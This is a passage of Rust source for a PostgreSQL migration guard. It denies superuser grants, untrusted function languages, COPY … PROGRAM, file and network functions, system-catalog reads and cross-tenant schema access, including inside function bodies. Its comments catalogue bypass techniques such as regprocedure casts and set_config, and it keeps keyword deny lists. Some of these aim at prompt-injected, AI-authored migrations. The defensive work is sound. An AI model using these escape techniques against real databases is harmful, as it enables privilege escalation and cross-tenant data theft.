            // SUPERUSER is the ONE role attribute that stays HARD-DENIED even
            // under Platform (vendor spec §3.4): a superuser bypasses RLS and
            // reaches the host (file I/O, `COPY … PROGRAM`). Platform widens
            // privilege *within* the DB, never *host* reach — so a
            // `CREATE/ALTER ROLE … SUPERUSER` is refused before the Platform
            // allow. (Trusted skips the whole deny-list earlier — operator owns
            // the DB.) This guards the vendor `createRole({ superuser: true })`
            // render-here-refuse-at-guard backstop.
            NodeEnum::CreateRoleStmt(s) => {
                if role_grants_superuser(&s.options) {
                    return Err(denied(rule::SUPERUSER_ROLE, raw));
                }
                if self.cfg.vendor_capabilities().allow_role {
                    return Ok(());
                }
                return Err(denied(rule::ROLE_MANAGEMENT, raw));
            }
            NodeEnum::AlterRoleStmt(s) => {
                if role_grants_superuser(&s.options) {
                    return Err(denied(rule::SUPERUSER_ROLE, raw));
                }
                if self.cfg.vendor_capabilities().allow_role {
                    return Ok(());
                }
                return Err(denied(rule::ROLE_MANAGEMENT, raw));
            }
            NodeEnum::AlterRoleSetStmt(_) | NodeEnum::DropRoleStmt(_) => {
                if self.cfg.vendor_capabilities().allow_role {
                    return Ok(());
                }
                return Err(denied(rule::ROLE_MANAGEMENT, raw));
            }
            // GRANT / REVOKE / role-membership grants — privilege management.
            // ALLOW iff Platform (§4.1): the platform schema migrations grant
            // CONNECT/USAGE/etc. (0025/0027). Confined still hard-denies.
            NodeEnum::GrantStmt(s) => {
                if grant_stmt_grants_privileged_role(s) {
                    return Err(denied(rule::PRIVILEGED_ROLE_GRANT, raw));
                }
                if self.cfg.vendor_capabilities().allow_grant {
                    return Ok(());
                }
                return Err(denied(rule::PRIVILEGE_MANAGEMENT, raw));
            }
            NodeEnum::GrantRoleStmt(s) => {
                if grant_role_stmt_grants_privileged_role(s) {
                    return Err(denied(rule::PRIVILEGED_ROLE_GRANT, raw));
                }
                if self.cfg.vendor_capabilities().allow_grant {
                    return Ok(());
                }
                return Err(denied(rule::PRIVILEGE_MANAGEMENT, raw));
            }
            NodeEnum::AlterDefaultPrivilegesStmt(s) => {
                if alter_default_privileges_grants_privileged_role(s) {
                    return Err(denied(rule::PRIVILEGED_ROLE_GRANT, raw));
                }
                if self.cfg.vendor_capabilities().allow_grant {
                    return Ok(());
                }
                return Err(denied(rule::PRIVILEGE_MANAGEMENT, raw));
            }
            // Database / FDW management — out of a project migrator's remit.
            NodeEnum::CreatedbStmt(_)
            | NodeEnum::AlterDatabaseStmt(_)
            | NodeEnum::AlterDatabaseSetStmt(_)
            | NodeEnum::DropdbStmt(_) => return Err(denied(rule::DATABASE_MANAGEMENT, raw)),
            NodeEnum::CreateFdwStmt(_)
            | NodeEnum::CreateForeignServerStmt(_)
            | NodeEnum::CreateForeignTableStmt(_)
            | NodeEnum::CreateUserMappingStmt(_)
            | NodeEnum::ImportForeignSchemaStmt(_) => {
                return Err(denied(rule::FDW_MANAGEMENT, raw))
            }
            // LOAD <library> — loads a shared object into the backend (RCE).
            NodeEnum::LoadStmt(_) => return Err(denied(rule::LOAD_LIBRARY, raw)),

            // ---- Allowlisted-safe (with per-kind sub-checks) ----
            NodeEnum::CreateFunctionStmt(f) => {
                // The funcname is the CREATION TARGET, not a call qualifier:
                // defining a function INTO `public`/`pg_catalog`/
                // `information_schema`/another tenant schema is denied (no
                // shared-schema exemption — that applies only to call sites).
                self.check_func_def_target(&f.funcname, raw)?;
                // Untrusted language (plpythonu/plperlu/c/…) — RCE.
                if let Some(lang) = function_language(&f.options) {
                    if !denylist::is_trusted_language(&lang) {
                        return Err(denied(rule::UNTRUSTED_LANGUAGE, raw));
                    }
                }
                // SECURITY DEFINER — runs with the migrator's privilege once
                // installed; an escalation primitive. Deny.
                if function_is_security_definer(&f.options) {
                    return Err(denied(rule::SECURITY_DEFINER, raw));
                }
                // A persisted `SET search_path` on the function escapes
                // confinement; deny (the DefElem name is `set`).
                if function_sets_forbidden_param(&f.options) {
                    return Err(denied(rule::FUNCTION_SET_SEARCH_PATH, raw));
                }
            }
            NodeEnum::AlterFunctionStmt(a) => {
                // ALTER FUNCTION targets an existing function; touching one in
                // a shared/system/foreign schema is out of remit (the func is
                // named in `func.objname`, an ObjectWithArgs).
                if let Some(func) = a.func.as_ref() {
                    self.check_func_def_target(&func.objname, raw)?;
                }
                // ALTER FUNCTION … SECURITY DEFINER / SET search_path = …
                if alter_function_is_security_definer(&a.actions) {
                    return Err(denied(rule::SECURITY_DEFINER, raw));
                }
                if alter_function_sets_forbidden_param(&a.actions) {
                    return Err(denied(rule::FUNCTION_SET_SEARCH_PATH, raw));
                }
            }
            NodeEnum::CreateExtensionStmt(e) => {
                let name = e.extname.to_ascii_lowercase();
                if denylist::list_contains_ci(denylist::FORBIDDEN_EXTENSIONS, &name) {
                    return Err(denied(rule::FORBIDDEN_EXTENSION, raw));
                }
                let allowed = self
                    .cfg
                    .extension_allowlist
                    .iter()
                    .any(|a| a.eq_ignore_ascii_case(&name));
                if !allowed {
                    return Err(denied(rule::EXTENSION_NOT_ALLOWLISTED, raw));
                }
            }
            NodeEnum::VariableSetStmt(s) => {
                let name = s.name.to_ascii_lowercase();
                if denylist::list_contains_ci(denylist::FORBIDDEN_SET_PARAMS, &name) {
                    return Err(denied(rule::FORBIDDEN_SET, raw));
                }
                // SET ROLE / SET SESSION AUTHORIZATION carry an empty `name`
                // but a dedicated kind; deny by the raw-text shape as a belt.
                let r = raw.to_ascii_lowercase();
                if r.starts_with("set role")
                    || r.starts_with("set session authorization")
                    || r.starts_with("set local role")
                {
                    return Err(denied(rule::SET_ROLE, raw));
                }
                // A benign typed SET (statement_timeout, etc.) is allowed.
            }
            NodeEnum::AlterTableStmt(at) => {
                // ALTER TABLE is safe ONLY for the enumerated subcommand set;
                // OWNER TO / INHERIT / REPLICA IDENTITY / generic-options are
                // out of remit and denied. Under Platform the four RLS subtypes
                // (ENABLE/FORCE/NO FORCE/DISABLE ROW LEVEL SECURITY) are also
                // admitted (§4.1; 0025).
                self.check_alter_table_cmds(at, raw)?;
            }
            NodeEnum::DropStmt(d) => {
                let caps = self.cfg.vendor_capabilities();
                // DROP ROLE via the DropStmt spelling — ALLOW iff Platform
                // (§4.1; the `.down.sql` reverse of CREATE ROLE), else deny.
                if d.remove_type == ObjectType::ObjectRole as i32 {
                    if caps.allow_role {
                        return Ok(());
                    }
                    return Err(denied(rule::ROLE_MANAGEMENT, raw));
                }
                // DROP is safe only for the enumerated object types. Under
                // Platform the extra set (schema/extension/policy — the
                // `.down.sql`-only reverses) is also admitted (§4.1).
                let drop_allowed = is_safe_drop_object(d.remove_type)
                    || platform_drop_object_allowed(d.remove_type, caps);
                if !drop_allowed {
                    return Err(denied(rule::UNRECOGNIZED_DANGEROUS, raw));
                }
            }
            // CREATE SCHEMA — deny-by-default for Confined; ALLOW iff Platform
            // (§4.1; 0001/0027 create the platform/oauth_hydra schemas). When
            // Platform, fall through to the cross-schema confinement below (the
            // schema being created is checked against the allowlist there).
            NodeEnum::CreateSchemaStmt(_) => {
                if !self.cfg.vendor_capabilities().allow_schema {
                    return Err(denied(rule::UNRECOGNIZED_DANGEROUS, raw));
                }
            }
            // CREATE POLICY (RLS) — deny-by-default for Confined; ALLOW iff
            // Platform (§4.1; 0025 RLS policies). When Platform, fall through;
            // cross-schema confinement on the policy's table still runs below.
            NodeEnum::CreatePolicyStmt(_) => {
                if !self.cfg.vendor_capabilities().allow_policy {
                    return Err(denied(rule::UNRECOGNIZED_DANGEROUS, raw));
                }
            }
            // DROP OWNED BY <role> — deny-by-default for Confined; ALLOW iff
            // Platform (§4.1; 0025 rollback DO-block).
            NodeEnum::DropOwnedStmt(_) => {
                if self.cfg.vendor_capabilities().allow_role {
                    return Ok(());
                }
                return Err(denied(rule::UNRECOGNIZED_DANGEROUS, raw));
            }
            NodeEnum::TransactionStmt(t) => {
                // BEGIN/START/COMMIT/ROLLBACK/SAVEPOINT/RELEASE/ROLLBACK TO are
                // fine; two-phase PREPARE TRANSACTION / COMMIT PREPARED /
                // ROLLBACK PREPARED reach the cluster's prepared-xact namespace
                // and are out of remit — denied.
                if !is_safe_transaction_kind(t.kind) {
                    return Err(denied(rule::UNRECOGNIZED_DANGEROUS, raw));
                }
            }

            // ---- Unconditionally-safe migration statement kinds ----
            NodeEnum::CreateStmt(_)
            | NodeEnum::IndexStmt(_)
            | NodeEnum::RenameStmt(_)
            | NodeEnum::CommentStmt(_)
            | NodeEnum::CreateTrigStmt(_)
            | NodeEnum::ViewStmt(_)
            | NodeEnum::CreateTableAsStmt(_)
            | NodeEnum::RefreshMatViewStmt(_)
            | NodeEnum::CreateEnumStmt(_)
            | NodeEnum::CompositeTypeStmt(_)
            | NodeEnum::CreateRangeStmt(_)
            | NodeEnum::AlterEnumStmt(_)
            | NodeEnum::AlterTypeStmt(_)
            // CREATE DOMAIN / ALTER DOMAIN — a domain is a constrained base
            // type (`CREATE DOMAIN d AS text CHECK (…)`); altering one is
            // `ADD`/`DROP CONSTRAINT`/`SET`. No privilege, RCE, or host reach —
            // ordinary schema DDL, safe under BOTH profiles, same class as
            // CREATE ENUM / CREATE TYPE above. The domain's CREATION TARGET
            // schema (`domainname`) and its base-type schema (`type_name`) are
            // still confined by `check_cross_schema` for the Confined profile.
            | NodeEnum::CreateDomainStmt(_)
            | NodeEnum::AlterDomainStmt(_)
            | NodeEnum::CreateSeqStmt(_)
            | NodeEnum::AlterSeqStmt(_)
            | NodeEnum::SelectStmt(_)
            | NodeEnum::InsertStmt(_)
            | NodeEnum::UpdateStmt(_)
            | NodeEnum::DeleteStmt(_)
            | NodeEnum::MergeStmt(_)
            | NodeEnum::TruncateStmt(_)
            | NodeEnum::VacuumStmt(_)
            | NodeEnum::ClusterStmt(_)
            | NodeEnum::ReindexStmt(_)
            | NodeEnum::DoStmt(_) => {}

            // ---- DENY-BY-DEFAULT: every unenumerated statement kind ----
            _ => return Err(denied(rule::UNRECOGNIZED_DANGEROUS, raw)),
        }
        Ok(())
    }

    /// Reject `ALTER TABLE` subcommands outside the safe migration set. Under
    /// Platform the four RLS subtypes are additionally admitted (§4.1).
    fn check_alter_table_cmds(
        &self,
        at: &protobuf::AlterTableStmt,
        raw: &str,
    ) -> Result<(), GuardError> {
        let allow_rls = self.cfg.vendor_capabilities().allow_rls;
        for cmd in &at.cmds {
            if let Some(NodeEnum::AlterTableCmd(c)) = cmd.node.as_ref() {
                let subtype_allowed = is_safe_alter_table_subtype(c.subtype)
                    || (allow_rls && is_platform_alter_table_subtype(c.subtype));
                if !subtype_allowed {
                    return Err(denied(rule::UNSAFE_ALTER_TABLE_CMD, raw));
                }
            }
        }
        Ok(())
    }

    /// Deny any explicit reference to a schema other than the project schema,
    /// found ANYWHERE in the full parse tree (Root Cause 2 fix).
    fn check_cross_schema(&self, json: &Value, raw: &str) -> Result<(), GuardError> {
        if let Some(schema) = foreign_schema_in_tree(json, &self.cfg.schemas) {
            return Err(GuardError::CrossSchema {
                schema,
                statement: raw.to_string(),
            });
        }
        Ok(())
    }

    /// Deny a function-DEFINING statement whose funcname targets a schema
    /// other than the project's own. The funcname here is a *creation target*
    /// (`CREATE FUNCTION public.evil()` / `ALTER FUNCTION control.f()`), NOT a
    /// call qualifier — so the `public`/`pg_catalog`/`information_schema`
    /// exemptions that apply at call sites do NOT apply: defining into any
    /// non-project schema is denied. `name` is the funcname/objname list of
    /// protobuf String nodes; an unqualified name (single part) is fine — it
    /// resolves under the pinned `search_path`.
    fn check_func_def_target(
        &self,
        name: &[protobuf::Node],
        raw: &str,
    ) -> Result<(), GuardError> {
        let parts: Vec<&str> = name
            .iter()
            .filter_map(|n| match n.node.as_ref() {
                Some(NodeEnum::String(s)) => Some(s.sval.as_str()),
                _ => None,
            })
            .collect();
        if parts.len() >= 2 {
            let schema = parts[0];
            if !self.cfg.schemas.permits(schema) {
                return Err(GuardError::CrossSchema {
                    schema: schema.to_string(),
                    statement: raw.to_string(),
                });
            }
        }
        Ok(())
    }

    /// Deny any `RangeVar` relation read/write that targets a system catalog.
    ///
    /// Catches both spellings the cross-schema walk cannot:
    ///   - qualified `pg_catalog.pg_authid` / `information_schema.tables`
    ///     (a `pg_catalog`/`information_schema` `RangeVar.schemaname`);
    ///   - **unqualified** `pg_shadow` / `pg_user` / `pg_authid` — the schema
    ///     is empty so the cross-schema walk sees nothing, but the `pg_`
    ///     prefix is reserved for system catalogs (a creator relation may not
    ///     use it), so an unqualified `pg_*` relation resolves to the catalog.
    fn check_system_catalog_relations(json: &Value, raw: &str) -> Result<(), GuardError> {
        let mut found = false;
        walk_range_vars(json, &mut |schema, relname| {
            let catalog_schema = is_neutral_catalog_schema(schema);
            let catalog_relname = relname.len() >= 3 && relname[..3].eq_ignore_ascii_case("pg_");
            if catalog_schema || (schema.is_empty() && catalog_relname) {
                found = true;
                return true;
            }
            false
        });
        if found {
            return Err(denied(rule::SYSTEM_CATALOG_ACCESS, raw));
        }
        Ok(())
    }

    /// Deny file-access / network function calls anywhere in the FULL tree.
    fn check_dangerous_functions(json: &Value, raw: &str) -> Result<(), GuardError> {
        let mut found: Option<&'static str> = None;
        walk_func_names(json, &mut |name| {
            if denylist::list_contains_ci(denylist::FILE_ACCESS_FUNCTIONS, name) {
                found = Some(rule::FILE_ACCESS_FUNCTION);
                return true;
            }
            if denylist::list_contains_ci(denylist::NETWORK_FUNCTIONS, name) {
                found = Some(rule::NETWORK_FUNCTION);
                return true;
            }
            false
        });
        if let Some(r) = found {
            return Err(denied(r, raw));
        }
        Ok(())
    }

    /// Deny a `<literal>::regprocedure` / `::regproc` cast whose literal names a
    /// `FILE_ACCESS` / `NETWORK` function. `'pg_read_file'::regprocedure` resolves
    /// the named function by OID at runtime — a dangerous capability the
    /// `FuncCall` walk misses because the function name is a bare string
    /// literal, not a call node. The literal may carry an argument signature
    /// (`'pg_read_file(text)'`); we match on the leading identifier.
    fn check_regproc_casts(json: &Value, raw: &str) -> Result<(), GuardError> {
        let mut found: Option<&'static str> = None;
        walk_regproc_casts(json, &mut |fname| {
            if denylist::list_contains_ci(denylist::FILE_ACCESS_FUNCTIONS, fname) {
                found = Some(rule::FILE_ACCESS_FUNCTION);
                return true;
            }
            if denylist::list_contains_ci(denylist::NETWORK_FUNCTIONS, fname) {
                found = Some(rule::NETWORK_FUNCTION);
                return true;
            }
            false
        });
        if let Some(r) = found {
            return Err(denied(r, raw));
        }
        Ok(())
    }

    /// Deny a schema-qualified object named inside a STRING LITERAL passed to a
    /// `reg*` cast or a name-resolving builtin.
    ///
    /// `'control.users'::regclass`, `nextval('control.s')`,
    /// `setval('control.billing_seq', 0)`, `to_regclass('control.users')`,
    /// `pg_get_serial_sequence('control.t','id')` all reach (read *or*
    /// mutate) a foreign-tenant object whose schema lives in an `A_Const`
    /// string literal — invisible to [`foreign_schema_in_tree`], which only
    /// sees structural qualified-name nodes. Here we parse the literal's
    /// leading `schema.` qualifier and run it through the SAME cross-schema
    /// policy (own-schema OK; otherwise denied — these are concrete object
    /// targets, so no shared-schema exemption, same as
    /// [`SchemaSlot::Object`]).
    ///
    /// SCOPE: only LITERAL arguments in these specific positions. A plain data
    /// literal (`INSERT … VALUES ('control.t')`) is untouched. A
    /// runtime-constructed argument (`nextval(some_var)`, `nextval('a'||'b')`)
    /// is NOT an `A_Const` and cannot be resolved at parse time — that is the
    /// line-2 (least-priv `migrator` role) defense's job, same limit the
    /// `format('%I', …)` arm acknowledges.
    fn check_literal_schema_refs(&self, json: &Value, raw: &str) -> Result<(), GuardError> {
        let mut found: Option<String> = None;
        walk_literal_schema_refs(json, &mut |literal, is_namespace_resolver| {
            // For `regnamespace`/`to_regnamespace` the literal IS a bare schema
            // name (`'control'`); for object resolvers the schema is the
            // leading `schema.` qualifier (`'control.t'`).
            let schema = if is_namespace_resolver {
                let s = literal.trim().trim_matches('"').trim();
                if s.is_empty() {
                    return false;
                }
                s.to_string()
            } else {
                match literal_schema_qualifier(literal) {
                    Some(s) => s,
                    None => return false,
                }
            };
            if self.cfg.schemas.permits(&schema) {
                return false;
            }
            // Concrete object target — Object-slot policy: no shared-schema
            // exemption (`public.t`/`pg_catalog.t`/`control.t` all denied).
            found = Some(schema);
            true
        });
        if let Some(schema) = found {
            return Err(GuardError::CrossSchema {
                schema,
                statement: raw.to_string(),
            });
        }
        Ok(())
    }

    /// Deny `set_config('search_path'|'role'|'session_authorization', …)`.
    ///
    /// `set_config(param, value, is_local)` is the function-call form of `SET
    /// param = value`. The structural [`NodeEnum::VariableSetStmt`] gate denies
    /// a `SET search_path`/`role`/`session_authorization`, but a `FuncCall`
    /// slips past it — so the call form is denied identically by matching the
    /// first string-literal argument against [`denylist::FORBIDDEN_SET_PARAMS`].
    /// A benign GUC (`statement_timeout`) stays allowed, mirroring the
    /// structural SET allowance. (Runtime-constructed param names are not
    /// literals and are out of parse-time scope — the line-2 role defense.)
    fn check_set_config_calls(json: &Value, raw: &str) -> Result<(), GuardError> {
        let mut denied_param = false;
        walk_set_config_calls(json, &mut |param| {
            if denylist::list_contains_ci(denylist::FORBIDDEN_SET_PARAMS, param) {
                denied_param = true;
                return true;
            }
            false
        });
        if denied_param {
            return Err(denied(rule::FORBIDDEN_SET, raw));
        }
        Ok(())
    }

    /// Deny dangerous SQL hidden in a `query_to_xml`-family string-literal arg.
    ///
    /// The XML-emitting table functions ([`denylist::SQL_STRING_ARG_FUNCTIONS`])
    /// take a free-form SQL string as their first argument that the server then
    /// executes. The structural func-walk and cross-schema walk are blind to it
    /// (the SQL lives in an `A_Const` text literal, not a parse subtree). We
    /// extract each such literal and run the SAME guard recursively via
    /// [`Self::check_body_text`] — re-parse + recurse (catching cross-schema
    /// reads, file/network funcs, embedded DDL) plus the token-scan + body
    /// cross-schema backstops. Only the literal (`A_Const`) form is in
    /// parse-scope; a runtime-constructed query arg is the line-2 role's job.
    fn check_sql_string_arg_calls(&self, json: &Value, raw: &str) -> Result<(), GuardError> {
        let mut sql_literals: Vec<String> = Vec::new();
        walk_sql_string_arg_calls(json, &mut |literal| {
            sql_literals.push(literal.to_string());
            false
        });
        for literal in sql_literals {
            // Re-run the FULL guard on the embedded SQL, attributing any denial
            // to the enclosing statement's text for accurate reporting.
            self.check_body_text(&literal, raw)?;
        }
        Ok(())
    }

    /// Recurse into DO-block + function bodies and re-check the embedded SQL.
    ///
    /// PL/pgSQL and SQL bodies are opaque *strings* in the parse tree, so a
    /// dangerous construct inside them is invisible to a top-level walk. We:
    ///   1. extract every body string (DO `args`, CREATE FUNCTION `as`);
    ///   2. attempt to re-parse it as SQL and recurse the guard (catches
    ///      embedded statements + EXECUTE 'literal sql');
    ///   3. additionally token-scan the body text for dangerous names that a
    ///      partial PL/pgSQL parse would miss (deny-by-default).
    fn check_bodies(&self, node: &NodeEnum, raw: &str) -> Result<(), GuardError> {
        let bodies: Vec<String> = match node {
            NodeEnum::DoStmt(d) => def_elem_string_args(&d.args),
            NodeEnum::CreateFunctionStmt(f) => function_body_strings(&f.options),
            _ => Vec::new(),
        };
        for body in bodies {
            self.check_body_text(&body, raw)?;
        }
        Ok(())
    }

    /// Check one body string: re-parse + recurse, then token-scan.
    fn check_body_text(&self, body: &str, raw: &str) -> Result<(), GuardError> {
        // (a) Re-parse the body (and any EXECUTE 'literal') as SQL and recurse.
        //     PL/pgSQL wrappers (BEGIN/END/PERFORM) won't fully parse, so this
        //     is best-effort; the token scan below is the backstop.
        if let Ok(parsed) = pg_query::parse(body) {
            for raw_stmt in &parsed.protobuf.stmts {
                if let Some(inner) = raw_stmt.stmt.as_ref().and_then(|s| s.node.as_ref()) {
                    let inner_raw = stmt_text(body, raw_stmt);
                    let json = guard_stmt_json(raw_stmt, &inner_raw)?;
                    // Recurse with the inner statement's own text for accurate
                    // error reporting.
                    self.check_node(inner, &json, &inner_raw)?;
                }
            }
        }

        // (b) Re-parse embedded string literals (EXECUTE 'CREATE ROLE …') —
        //     find single-quoted SQL fragments and re-check them.
        for literal in extract_string_literals(body) {
            if let Ok(parsed) = pg_query::parse(&literal) {
                for raw_stmt in &parsed.protobuf.stmts {
                    if let Some(inner) = raw_stmt.stmt.as_ref().and_then(|s| s.node.as_ref()) {
                        let json = guard_stmt_json(raw_stmt, &literal)?;
                        self.check_node(inner, &json, &literal)?;
                    }
                }
            }
        }

        // (c) Token-scan backstop — catch dangerous names a partial parse of a
        //     PL/pgSQL body would never surface as a FuncCall/Stmt node.
        let lower = body.to_ascii_lowercase();
        for &f in denylist::FILE_ACCESS_FUNCTIONS {
            if word_present(&lower, f) {
                return Err(denied(rule::BODY_INSPECTION, raw));
            }
        }
        for &f in denylist::NETWORK_FUNCTIONS {
            if word_present(&lower, f) {
                return Err(denied(rule::BODY_INSPECTION, raw));
            }
        }
        // search_path escape / alter system / role mgmt hidden in EXECUTE text.
        // Under Platform (§4.2) the role-management + search_path needles are
        // relaxed — 0025's bootstrap DO-block legitimately EXECUTEs
        // `CREATE ROLE …` / `ALTER ROLE … SET search_path …` — but `ALTER
        // SYSTEM` and `SUPERUSER` STAY hard in BOTH profiles (neither has any
        // place in any migration). The recursion arm (a) has already admitted
        // the genuinely parsed CREATE ROLE / GRANT nodes under Platform; this
        // token scan is the lexical backstop for PL/pgSQL bodies that do not
        // parse as top-level SQL.
        if body_contains_superuser_role_escalation(&lower) {
            return Err(denied(rule::BODY_INSPECTION, raw));
        }
        let allow_role = self.cfg.trust() == TrustProfile::Platform;
        let needles: &[&str] = if allow_role {
            &["alter system"]
        } else {
            &["alter system", "create role", "create user", "drop role"]
        };
        for needle in needles {
            if lower.contains(needle) {
                return Err(denied(rule::BODY_INSPECTION, raw));
            }
        }
        if !allow_role && lower.contains("search_path") {
            return Err(denied(rule::BODY_INSPECTION, raw));
        }
        // COPY … PROGRAM hidden in a body.
        if lower.contains("program") && lower.contains("copy") {
            return Err(denied(rule::BODY_INSPECTION, raw));
        }
        // Untrusted-language nested CREATE FUNCTION inside a body.
        if lower.contains("language plpythonu")
            || lower.contains("language plperlu")
            || lower.contains("language c ")
        {
            return Err(denied(rule::BODY_INSPECTION, raw));
        }
        // (d) Cross-schema: any `schema.` qualifier in the body that is not the
        //     project schema is a cross-tenant reference the body re-parse
        //     could not surface (PL/pgSQL BEGIN/END wrappers don't parse as
        //     plain SQL). Deny-by-default.
        if let Some(schema) = foreign_schema_in_body(body, &self.cfg.schemas) {
            return Err(GuardError::CrossSchema {
                schema,
                statement: raw.to_string(),
            });
        }
        // (e) Runtime-constructed SQL: a PL/pgSQL body that builds a
        //     schema-qualified name via `format('%I.…', s)` never shows the
        //     target schema as a `schema.ident` adjacency — it's a bare
        //     string literal (`s := 'control'`) or a `format()` arg. Flag any
        //     bare literal that names a platform schema, and — when the body
        //     uses an `%I` identifier template — any bare-identifier literal
        //     that is not the project schema (reaching ANOTHER project's
        //     schema). Deny-by-default for the dynamic-SQL class.
        if let Some(schema) =
            foreign_schema_literal_in_body(body, &self.cfg.schemas)
        {
            return Err(GuardError::CrossSchema {
                schema,
                statement: raw.to_string(),
            });
        }
        Ok(())
    }
}

/// Run the same raw-body deny-list scanner used for function bodies over a raw
/// view SELECT body. This is intentionally narrower than [`SqlGuard::check`]:
/// callers separately assert that the body parses as exactly one top-level
/// `SELECT`, then use this helper for the body reparse/string-literal/token
/// backstops (`pg_read_file`, network functions, COPY PROGRAM, dynamic
/// cross-schema text, etc.).
///
/// # Errors
/// [`GuardError`] when the body scanner finds a denied token or cross-schema
/// reference.
pub(crate) fn check_raw_view_body_text(
    body: &str,
    raw: &str,
    scope: Option<&SchemaScope>,
) -> Result<(), GuardError> {
    let schemas = scope
        .cloned()
        .unwrap_or_else(|| SchemaScope::Allowlist(Vec::new()));
    let guard = SqlGuard::new(GuardConfig {
        trust: TrustProfile::Confined,
        capabilities: VendorCapabilities::confined(),
        skip_denylist_belt: false,
        schemas,
        extension_allowlist: Vec::new(),
        require_rls: false,
        destructive_ops: DestructiveOps::Allow,
        dialect: SqlDialect::Postgres,
    });
    guard.check_body_text(body, raw)
}

/// Scan a PL/pgSQL body's **bare string literals** for a cross-tenant schema
/// name that `format('%I.…', s)`-style dynamic SQL would interpolate.
///
/// The structural/`schema.ident` checks never see these — the schema is a
/// runtime value (`s := 'control'`) or a `format()` argument, not an adjacency.
/// Two postures, both deny-by-default for the dynamic-SQL class:
///   1. Any bare literal that *is* a platform schema (`control`/`auth`/
///      `billing`) — these have no legitimate use as data in a creator body.
///   2. If the body uses an `%I` identifier-format template (the tell of
///      dynamic schema/relation interpolation), any bare *identifier* literal
///      that is not the project schema — reaching another project's schema.
fn foreign_schema_literal_in_body(body: &str, scope: &SchemaScope) -> Option<String> {
    let uses_ident_template = body.to_ascii_lowercase().contains("%i");
    for literal in extract_string_literals(body) {
        let lit = literal.trim();
        // A schema the scope permits is never a violation. Under `Single(s)`
        // this is `lit.eq_ignore_ascii_case(s)` (the project schema, case-
        // insensitively — see `SchemaScope::permits`); under `Allowlist` an
        // operator-supplied schema is exempt.
        if scope.permits(lit) {
            continue;
        }
        // (1) platform schema named directly. The `PLATFORM_SCHEMAS` lexical
        //     backstop fires for any schema in PLATFORM_SCHEMAS that the scope
        //     did NOT permit (port schemas `zeroship`/`oauth_hydra`/`public`
        //     are not in PLATFORM_SCHEMAS, so they already pass — §4.2/HIGH-3).
        if denylist::list_contains_ci(denylist::PLATFORM_SCHEMAS, lit) {
            return Some(lit.to_string());
        }
        // (2) bare identifier reaching another schema under an %I template.
        if uses_ident_template && is_bare_identifier(lit) && looks_like_schema_name(lit) {
            return Some(lit.to_string());
        }
    }
    None
}

/// A literal that is a single bare SQL identifier (`[A-Za-z_][A-Za-z0-9_]*`),
/// the shape a schema/relation name interpolated via `%I` would take.
fn is_bare_identifier(s: &str) -> bool {
    let mut bytes = s.bytes();
    match bytes.next() {
        Some(b) if b.is_ascii_alphabetic() || b == b'_' => {}
        _ => return false,
    }
    bytes.all(is_ident_byte)
}

/// Heuristic: does a bare identifier look like a schema name a migration would
/// target? We flag the platform schemas plus anything matching the project
/// prefix convention (`project_…`) — the multi-tenant schemas a body could
/// reach. A short data token like `'active'` does not match, avoiding
/// false-positives on legitimate seed data passed through `%I`-bearing bodies.
fn looks_like_schema_name(s: &str) -> bool {
    let l = s.to_ascii_lowercase();
    denylist::list_contains_ci(denylist::PLATFORM_SCHEMAS, &l) || l.starts_with("project_")
}

/// Scan a body string for a `<schema>.<object>` qualifier that names a known
/// **platform schema** (`control`/`auth`/`billing`) — the cross-tenant target
/// a prompt-injected migration would aim at. Returns that schema.
///
/// This is a lexical backstop for PL/pgSQL bodies that do not parse as plain
/// SQL (so the structural `RangeVar` check never sees them). It is deliberately
/// scoped to the platform schemas rather than "any dotted identifier" so it
/// does not false-positive on PL/pgSQL record fields (`NEW.col`, `OLD.col`) or
/// table-alias column refs (`p.id`). Cross-references to *another project's*
/// schema still go through real parsed statements (CREATE/INSERT/DROP carry a
/// `RangeVar`), which `check_cross_schema` catches structurally; and the
/// project's own role/pinned-search_path is the runtime confinement for the
/// rest. `project_schema` is excluded so a project legitimately naming its own
/// schema in a body is fine.
fn foreign_schema_in_body(body: &str, scope: &SchemaScope) -> Option<String> {
    let bytes = body.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        // Find a dot with an identifier char on both sides.
        if bytes[i] == b'.' && i > 0 && is_ident_byte(bytes[i - 1]) {
            // Walk left to the start of the left identifier.
            let mut s = i;
            while s > 0 && is_ident_byte(bytes[s - 1]) {
                s -= 1;
            }
            if bytes.get(i + 1).copied().is_some_and(is_ident_byte) {
                let schema = &body[s..i];
                // A scope-permitted schema is never a violation (`Single(s)` ⇒
                // `schema.eq_ignore_ascii_case(s)` — the project schema, case-
                // insensitively). The
                // `PLATFORM_SCHEMAS` backstop fires for any non-permitted schema
                // in PLATFORM_SCHEMAS (the port schemas are not in it — HIGH-3).
                if !scope.permits(schema)
                    && denylist::list_contains_ci(denylist::PLATFORM_SCHEMAS, schema)
                {
                    return Some(schema.to_string());
                }
            }
        }
        i += 1;
    }
    None
}

/// Derive the migration flags from a passing [`GuardReport`] (design §1.6).
///
/// - `destructive` (data loss) ⇒ `requires_approval` (the gate must confirm;
///   AI never auto-applies destructive ops).
/// - any non-transactional statement (CONCURRENTLY, ALTER TYPE ADD VALUE,
///   VACUUM) ⇒ `transactional = false` (the two-phase apply path).
/// - a `RENAME COLUMN` / `RENAME TABLE` ⇒ `requires_approval` even though it is
///   NOT data-loss `destructive` (MED-1): a rename is app-breaking /
///   backward-incompatible (it silently breaks every reader of the old name), so
///   it must be operator-confirmed, never auto-applied. (The declarative
///   expand-contract rename path does NOT emit a bare `RenameStmt` — it emits
///   ADD COLUMN + trigger + backfill + DROP via `ExpandContractAuthor` — so this
///   gate is scoped to a literal `RENAME` in a submitted `up`.)
/// - an `ALTER COLUMN … SET NOT NULL` ⇒ `requires_approval` (MED-2): it takes an
///   ACCESS EXCLUSIVE lock + a full-table validating scan and ABORTS if any
///   existing row is NULL — and the row-less shadow CANNOT catch that abort/lock,
///   so it is gated regardless of the (necessarily clean) dry-run.
///
/// `online` is an authoring-time facet (expand-contract sequencing), not
/// derivable from a single SQL blob, so it stays at its default here.
#[must_use]
pub fn flags_for(report: &GuardReport) -> MigrationFlags {
    let non_transactional = report.classes.iter().any(|c| c.non_transactional);
    // MED-1 — a bare RENAME COLUMN / RENAME TABLE is gated (requires_approval) even
    // though it is not data-loss-destructive: it is backward-incompatible.
    let has_rename = report
        .classes
        .iter()
        .any(|c| matches!(c.kind, DdlKind::RenameColumn | DdlKind::RenameTable));
    // MED-2 — SET NOT NULL is gated regardless of the dry-run: the row-less shadow
    // has no data, so it can never reproduce the populated-column abort / the
    // ACCESS EXCLUSIVE validating-scan lock a SET NOT NULL takes on a real table.
